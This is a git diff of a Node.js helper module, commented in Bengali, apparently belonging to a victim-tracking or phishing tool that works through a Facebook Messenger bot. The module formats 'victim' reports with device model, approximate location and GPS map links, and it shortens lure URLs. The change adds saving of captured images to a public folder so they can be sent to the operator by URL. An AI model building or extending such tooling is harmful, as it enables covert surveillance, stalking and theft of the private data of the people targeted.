@@ -2,6 +2,7 @@ const axios = require('axios');
 const Config = require('../models/Config');
 const fs = require('fs-extra');
 const path = require('path');
+const { nanoid } = require('nanoid');
 
 function getLocalConfig() {
     const file = path.join(__dirname, '../data/config.json');
@@ -38,6 +39,9 @@ async function getConfig() {
     }
 }
 
+// ================================================================
+// টেক্সট মেসেজ
+// ================================================================
 async function sendMessage(recipientId, text) {
     try {
         const config = await getConfig();
@@ -74,9 +78,30 @@ async function sendMessage(recipientId, text) {
 }
 
 // ================================================================
-// 🔥 সঠিক ইমেজ পাঠানোর পদ্ধতি (Facebook API)
+// ইমেজ ফাইল সেভ করা (নতুন)
 // ================================================================
-async function sendImageMessage(recipientId, base64Image) {
+async function saveImageFile(base64Image) {
+    try {
+        const imagesDir = path.join(__dirname, '../public/images');
+        await fs.ensureDir(imagesDir);
+        
+        const filename = `${nanoid(10)}.jpg`;
+        const filepath = path.join(imagesDir, filename);
+        
+        const buffer = Buffer.from(base64Image, 'base64');
+        await fs.writeFile(filepath, buffer);
+        
+        return filename;
+    } catch (err) {
+        console.error('❌ ইমেজ সেভ করতে ব্যর্থ:', err);
+        return null;
+    }
+}
+
+// ================================================================
+// ইমেজ মেসেজ পাঠানো (URL সহ)
+// ================================================================
+async function sendImageMessage(recipientId, imageUrl) {
     try {
         const config = await getConfig();
         const token = config.pageAccessToken;
@@ -85,14 +110,6 @@ async function sendImageMessage(recipientId, base64Image) {
             return { success: false, error: 'TOKEN_MISSING' };
         }
 
-        // ১. ইমেজ রি-সাইজ করা (আমরা ছোট সাইজে পাঠাচ্ছি)
-        // base64 ডেটাকে আপলোডযোগ্য ফরম্যাটে নিতে হবে
-        // Facebook API ইমেজ আপলোডের জন্য base64 সাপোর্ট করে না।
-        // সঠিক উপায়: প্রথমে ইমেজ আপলোড করে attachment_id নেওয়া।
-
-        // কিন্তু আমরা এখানে সরাসরি URL পদ্ধতি ব্যবহার করছি (যা শুধুমাত্র image_data দিয়ে কাজ করে)
-        // https://developers.facebook.com/docs/messenger-platform/send-messages/#image_attachment
-        
         const response = await axios.post(
             `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
             {
@@ -102,7 +119,7 @@ async function sendImageMessage(recipientId, base64Image) {
                         type: 'image',
                         payload: {
                             is_reusable: false,
-                            url: `data:image/jpeg;base64,${base64Image}`
+                            url: imageUrl
                         }
                     }
                 }
@@ -123,6 +140,9 @@ async function sendImageMessage(recipientId, base64Image) {
     }
 }
 
+// ================================================================
+// ইউজার প্রোফাইল
+// ================================================================
 async function getUserProfile(senderId) {
     try {
         const config = await getConfig();
@@ -136,6 +156,9 @@ async function getUserProfile(senderId) {
     }
 }
 
+// ================================================================
+// লিংক শর্ট করা (ব্যর্থ হলে আসল লিংক)
+// ================================================================
 async function shortenUrl(longUrl) {
     try {
         const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, {
@@ -153,6 +176,9 @@ async function shortenUrl(longUrl) {
     }
 }
 
+// ================================================================
+// ফোনের মডেল বের করা
+// ================================================================
 function getDeviceModel(device) {
     const ua = device.userAgent || '';
     
@@ -174,6 +200,9 @@ function getDeviceModel(device) {
     return device.platform || 'N/A';
 }
 
+// ================================================================
+// ভিক্টিম ডেটা ফরম্যাট (ক্যামেরা লাইন বাদ)
+// ================================================================
 function formatVictimData(victim) {
     const d = victim.device || {};
     const deviceTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
@@ -204,10 +233,14 @@ function formatVictimData(victim) {
         msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
     }
     
+    // ক্যামেরা সম্পর্কিত লাইন সরানো হয়েছে
     msg += `\n\n🆔 ভিক্টিম আইডি: ${victim.id}`;
     return msg;
 }
 
+// ================================================================
+// লোকেশন মেসেজ
+// ================================================================
 function formatLocationMessage(gpsLocation) {
     if (!gpsLocation || !gpsLocation.latitude) return null;
     const mapLink = gpsLocation.googleMaps || 
@@ -223,6 +256,7 @@ module.exports = {
     getConfig,
     getLocalConfig,
     sendMessage,
+    saveImageFile,
     sendImageMessage,
     getUserProfile,
     shortenUrl,
